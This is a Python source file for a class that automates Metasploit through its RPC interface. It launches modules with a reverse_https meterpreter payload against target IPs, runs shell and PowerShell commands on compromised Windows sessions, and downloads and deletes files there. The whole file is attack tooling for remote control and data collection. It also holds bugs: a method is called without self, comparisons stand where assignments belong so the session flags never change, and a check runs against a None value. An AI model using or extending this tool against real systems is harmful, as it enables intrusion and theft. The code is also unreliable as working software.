import asyncio
import os
#from IPython import embed

class MsfWrapper:

    def __init__(self, client):
        self.client = client
        psh_import_folder = None
        self.sess_data = {}

    def debug_info(self, output, label, label_num):
        if output:
            for l in output.splitlines():
                print('[DEBUG] {} {} output: {}'.format(label, label_num, l))
        else:
            print('Metasploit returned None instead of output '+label+' '+label_num)


    async def get_sessions(self):
        '''
        Get list of MSF sessions from RPC server 
        '''
        msf_sessions = self.client.call('session.list')

        for msf_sess_num in msf_sessions:
            msf_sess_num_str = str(msf_sess_num)

            # If the session was found from polling MSF but its not in sess_data
            if msf_sess_num_str not in self.sess_data:
                await self.update_session(msf_sess_num_str, msf_sessions)


    async def update_session(self, msf_sess_num_str, msf_sessions):
        '''
        Creates new session data dictionary with updated and new values
        '''
        self.sess_data[msf_sess_num_str] = msf_sessions[int(msf_sess_num_str)]

        # There's gotta be a better of doing this
        # Set the keys all to utf8
        self.sess_data[msf_sess_num_str] = {k.decode('utf8'): v for k,v in self.sess_data[msf_sess_num_str].items() if isinstance(k, bytes)}
        # Set all the values to utf8
        self.sess_data[msf_sess_num_str] = {k:v.decode('utf8') for k,v in self.sess_data[msf_sess_num_str].items() if isinstance(v, bytes)}

        self.sess_data[msf_sess_num_str]['busy'] = 'False'
        # This probably needs renaming to like, 'info_gathered' or something
        # since it's a test to see if domain data and stuff has been added
        # might be able to remove it entirely
        self.sess_data[msf_sess_num_str]['first_check'] = 'False'
        # Fill this with cmds that errored out
        self.sess_data[msf_sess_num_str]['errors'] = []
        self.sess_data[msf_sess_num_str]['session_number'] = msf_sess_num_str
        self.sess_data[msf_sess_num_str]['in_os_shell'] = 'False'
        self.sess_data[msf_sess_num_str]['plugins'] = []
        await self.get_user(msf_sess_num_str)


    async def get_user(self, sess_num):
        '''
        Gets user data from session
        '''
        cmd = 'getuid'
        end_strs = ['server username:']
        output, err = await self.run_session_cmd(sess_num, cmd, end_strs)
       
        if err:
            self.sess_data[sess_num]['user'] = 'ERROR'
            self.sess_data[sess_num]['errors'].append(cmd)
        else:
            user = output.split('Server username: ')[-1].strip()
            self.sess_data[sess_num]['user'] = user


    async def run_console_cmd(self, c_id, cmd):
        '''
        Runs module and gets output
        '''
        # Only console.xxx API calls require \n in cmds
        # session.xxx API calls do not require \n
        cmd = cmd + '\n'

        self.client.call('console.write',[c_id, cmd])

        output = await self.get_console_output(c_id)
        self.debug_info(output, 'Console', c_id)###
        err = self.get_output_errors(output, cmd)

        return (output, err)


    async def run_msf_module(self, c_id, mod, rhost_var, target_ips, lhost, extra_opts, start_cmd):

        payload = 'windows/x64/meterpreter/reverse_https' #####TODO
        cmd = create_msf_cmd(mod, rhost_var, target_ips, lhost, payload, extra_opts, start_cmd)
        mod_out, err = await self.run_console_cmd(c_id, cmd)

        return (cmd, mod_out, err)


    def create_msf_cmd(self, module_path, rhost_var, target_ips, lhost, payload, extra_opts, start_cmd):
        cmds = ('use {}\n'
                'set {} {}\n'
                'set LHOST {}\n'
                'set payload {}\n'
                '{}\n'
                '{}').format(module_path, rhost_var, target_ips, lhost, payload, extra_opts, start_cmd)

        return cmds


    async def get_console_output(self, c_id, timeout=20):
        '''
        The only way to get console busy status is through console.read or console.list
        console.read clears the output buffer so you gotta use console.list
        but console.list requires you know the list offset of the c_id console
        so the list comprehension seems necessary to avoid assuming
        what the right list offset might be
        '''
        counter = 0
        sleep_secs = 1
        consoles = [x[b'id'].decode('utf8') for x in self.client.call('console.list')[b'consoles']]
        list_offset = consoles.index(c_id)
        output = ''

        # Give it a chance to start
        await asyncio.sleep(sleep_secs)

        # Get any initial output
        output += self.client.call('console.read', [c_id])[b'data'].decode('utf8')

        # Make sure the console is not busy
        while self.client.call('console.list')[b'consoles'][list_offset][b'busy'] == True:
            output += self.client.call('console.read', [c_id])[b'data'].decode('utf8')
            await asyncio.sleep(sleep_secs)
            counter += sleep_secs

        # 
        #while True:
        #    output += self.client.call('console.read', [c_id])[b'data'].decode('utf8')

        #    if end_strs:

        #        if any(end_str in output.lower() for end_str in end_strs):
        #            break

        #    if counter > timeout:
        #        break

        #    await asyncio.sleep(sleep_secs)
        #    counter += sleep_secs

        # Get remaining output
        output += self.client.call('console.read', [c_id])[b'data'].decode('utf8')

        #self.debug_info(output, 'Console', c_id)

        return output


    async def run_session_cmd(self, sess_num, cmd, end_strs, api_call='run_single', timeout=20):

        err = None
        output = None
        error_msg = 'Error in session {}: {}'
        
        await self.make_session_busy(sess_num)

        res = self.client.call('session.meterpreter_{}'.format(api_call), [sess_num, cmd])

        # Error from MSF API
        if b'error_message' in res:
            err_msg = res[b'error_message'].decode('utf8')
            self.sess_data[sess_num]['errors'].append(err_msg)
            self.make_session_not_busy(sess_num)
            return (None, err_msg)

        # Successfully completed MSF API call
        elif res[b'result'] == b'success':

            counter = 0
            sleep_secs = 1
            full_output = ''

            try:
                num_es = 1
                while True:
                    await asyncio.sleep(sleep_secs)

                    output, err = self.get_output(sess_num)
                    if output:
                        self.debug_info(output, 'Session', sess_num)###
                        full_output += output

                    # Error from meterpreter console
                    if err:
                        self.sess_data[sess_num]['errors'].append(err)
                        break

                    # Check for errors from cmd's output
                    err = self.get_output_errors(full_output, cmd)
                    if err:
                        break

                    # If no terminating string specified just wait til timeout
                    counter += sleep_secs
                    if counter > timeout:
                        err = 'Command [{}] timed out'.format(cmd.strip())
                        break

                    # Successfully completed
                    if end_strs:
                        if any(end_str in output.lower() for end_str in end_strs):
                            break

                    # If no end_strs specified just return once we have any data or until timeout
                    else:
                        if len(full_output) > 0:
                            break

            # This usually occurs when the session suddenly dies or user quits it
            except Exception as e:
                # Get the last of the data to clear the buffer
                clear_buffer = self.client.call('session.meterpreter_read', [sess_num])
                err = 'exception below likely due to abrupt death of session'
                self.sess_data[sess_num]['errors'].append(err)
                #self.debug_info(full_output, 'Session', sess_num)
                self.make_session_not_busy(sess_num)
                return (full_output, err)

        # b'result' not in res, b'error_message' not in res, just catch everything else as an error
        else:
            err = res[b'result'].decode('utf8')
            self.sess_data[sess_num]['errors'].append(err)

        # Get the last of the data to clear the buffer
        clear_buffer = self.client.call('session.meterpreter_read', [sess_num])

        #self.debug_info(full_output, 'Session', sess_num)

        self.make_session_not_busy(sess_num)

        return (full_output, err)


    def get_output(self, sess_num):
        output = self.client.call('session.meterpreter_read', [sess_num])

        # Everythings fine
        if b'data' in output:
            decoded_out = output[b'data'].decode('utf8')
            return (decoded_out, None)

        # Got an error from the client.call
        elif b'error_message' in output:
            decoded_err = output[b'error_message'].decode('utf8')
            return (None, decoded_err)


    def get_output_errors(self, output, cmd):

        script_errors = ['[-] post failed',
                         'error in script',
                         'operation failed',
                         'unknown command',
                         'operation timed out',
                         'operation failed:',
                         'unknown session id',
                         'error running',
                         'failed to load extension',
                         'requesterror',
                         'is not a valid option for this module',
                         'is not recognized as an',
                         ' failed: rex::',
                         'error:     + fullyqualifiederrorid : ']
        err = None

        # Got an error from output
        if any(x in output.lower() for x in script_errors):
            # This is the error that occurs when you try to run a powershell cmd
            # while another is running so it will continuously show up if we are
            # running a long-running PSH cmd
            if '2148734468' not in err:
                err = 'Command [{}] failed with error: {}'.format(cmd.splitlines()[0], output.strip())

        return err

    async def get_writeable_path(self, sess_num):
        ''' Get a writeable directory on the remote computer '''

        if 'write_path' in self.sess_data[sess_num]:
            write_path = self.sess_data[sess_num]['write_path']

        # System's write path will just be C:\windows\temp
        #elif b'authority\\system' in self.sess_data[sess_num][b'user'].lower():
        elif 'authority\\system' in self.sess_data[sess_num]['info'].lower():
            cmd = 'echo %WINDIR%'
            win_dir = await self.get_env_dir(sess_num, cmd)
            write_path = win_dir+'\\temp\\'
            self.sess_data[sess_num]['write_path'] = write_path

        # Regular user write path will be something like "C:\users\username\AppData\Local"
        else:
            cmd = 'echo %USERPROFILE%'
            home_dir = await self.get_env_dir(sess_num, cmd)
            write_path = home_dir + '\\AppData\\Local\\'
            self.sess_data[sess_num]['write_path'] = write_path

        return write_path+'cache'


    async def get_env_dir(self, sess_num, cmd):
        end_strs = ['>']

        output, err = await self.run_shell_cmd(sess_num, cmd, end_strs)

        if output:
            for l in output.splitlines():
                if ':\\' in l:
                    directory = l.strip()
                    await self.end_shell(sess_num)
                    return directory


    async def import_psh(self, sess_num, filename):
        '''
        Imports PowerShell scripts
        '''
        # Load powershell plugin
        plugin = 'powershell'
        if plugin not in self.sess_data[sess_num]['plugins']:
            output, err = await self.load_plugin(sess_num, 'powershell')

        if not self.psh_import_folder:
            return 'No PowerShell import folder set'

        if self.psh_import_folder.endswith('/'):
            path = self.psh_import_folder + filename
        else: 
            path = self.psh_import_folder + '/' + filename

        cmd = 'powershell_import ' + path
        end_strs = ['successfully imported.']

        output, err = await self.run_session_cmd(sess_num, cmd, end_strs)

        return (output, err)


    async def run_psh_cmd_with_output(self, sess_num, ps_cmd):#, write_path):
        '''
        There is no timeout setting for the powershell plugin in metasploit
        so shit just times out super fast. We hack around this by running long-running
        cmds then trying a fast cmd like write-host and wait until write-host actually
        works
        '''

        # Load powershell plugin
        plugin = 'powershell'
        if plugin not in self.sess_data[sess_num]['plugins']:
            output, err = await self.load_plugin(sess_num, 'powershell')
        
        # Get write path
        write_path = await self.get_writeable_path(sess_num)
        redir_out = ' > "{}"'.format(write_path)

        cmd = 'powershell_execute \'{}{}\''.format(ps_cmd, redir_out)
        end_strs = ['command execution completed']

        output, err = await self.run_session_cmd(sess_num, cmd, end_strs)
        if err:
            # Timeouts are ineffective measures of whether the cmd is done
            # because MSF doesn't have a way of changing powershell_execute
            # timeout values. However, after the cmd times out MSF won't kill
            # the PSH cmd; MSF will just return "operation failed: 2148734468"
            # when you try to run a new PSH cmd until the first cmd finishes
            if 'timed out' in err:
                await self.wait_for_psh_cmd(sess_num, cmd)
            else:
                return (None, err)

        # Download and read remote file
        output, err = await self.read_remote_file(sess_num, write_path)
        if output:
            output = output.decode('utf16')

        self.make_session_not_busy(sess_num)

        return output, err


    async def load_plugin(self, sess_num, plugin):
        '''
        Loads plugin in session
        '''
        # Load powershell plugin
        cmd = 'load '+plugin
        end_strs = ['extension has already been loaded', 'success']
        output, err = await self.run_session_cmd(sess_num, cmd, end_strs)
        self.sess_data[sess_num]['plugins'].append(plugin)
        return (output, err)


    async def read_remote_file(self, sess_num, remote_path):
        '''
        Downloads and outputs a remote file's contents
        '''
        local_path = os.getcwd()
        cmd = 'download "{}" {}'.format(remote_path, local_path)
        end_strs = ['[*] download   :', '[*] skipped    :']
        output, err = await self.run_session_cmd(sess_num, cmd, end_strs)
        if err:
            return (None, err)

        cmd = 'rm "{}"'.format(remote_path)
        end_strs = ['']
        output, err = await self.run_session_cmd(sess_num, cmd, end_strs)

        # We are setting output to blank string so just to make sure
        # the cmd completed we'll just wait a few secs
        await asyncio.sleep(3)

        filename = remote_path.split('\\')[-1]
        with open(filename, 'rb') as f:
            content = f.read()

        err = None
        return (content, err) 


    async def wait_for_psh_cmd(self, sess_num, cmd):
        '''
        Wait for long running PSH cmd to finish and write to file
        '''
        while True:
            running_ps_cmd = cmd.split()[1][1:] # get function name and knock off the first '
            end_strs = ['finished']
            cmd = 'powershell_execute "Write-Output \'Checking if [{}] has finished\'"'.format(running_ps_cmd)
            output, err = await self.run_session_cmd(sess_num, cmd, end_strs)
            if not err:
                break
            await asyncio.sleep(1)


    async def run_shell_cmd(self, sess_num, cmd, end_strs, exit_shell=True):
        ''' Run a windows shell command '''

        # start the shell or skip if already in shell
        if self.sess_data[sess_num]['in_os_shell'] == 'False':
            output, err = await self.start_shell(sess_num)
            if not err:
                self.sess_data[sess_num]['in_os_shell'] == 'True'

        # run cmd
        output, err = await self.run_session_cmd(sess_num, cmd, end_strs, api_call='write')

        # kill shell if we want
        if exit_shell == True:
            await self.end_shell(sess_num)

        return (output, err)


    async def start_shell(self, sess_num):
        ''' start OS cmd prompt on a meterpreter session '''

        cmd = 'shell'
        end_strs = ['>']
        output, err = await self.run_session_cmd(sess_num, cmd, end_strs)

        if 'is not recognized as an internal or external command' in output:
            await self.end_shell(sess_num)
            output, err = await self.run_session_cmd(sess_num, cmd, end_strs)

        return (output, err)


    async def end_shell(self, sess_num):
        ''' Ends the OS shell prompt in a session '''

        self.client.call('session.meterpreter_detach_session', [sess_num])
        self.sess_data[sess_num]['in_os_shell'] == 'False'


    async def make_session_busy(self, sess_num):
        while self.sess_data[sess_num]['busy'] == 'True':
            await asyncio.sleep(1)
        self.sess_data[sess_num]['busy'] == 'True'


    def make_session_not_busy(self, sess_num):
        self.sess_data[sess_num]['busy'] == 'False'

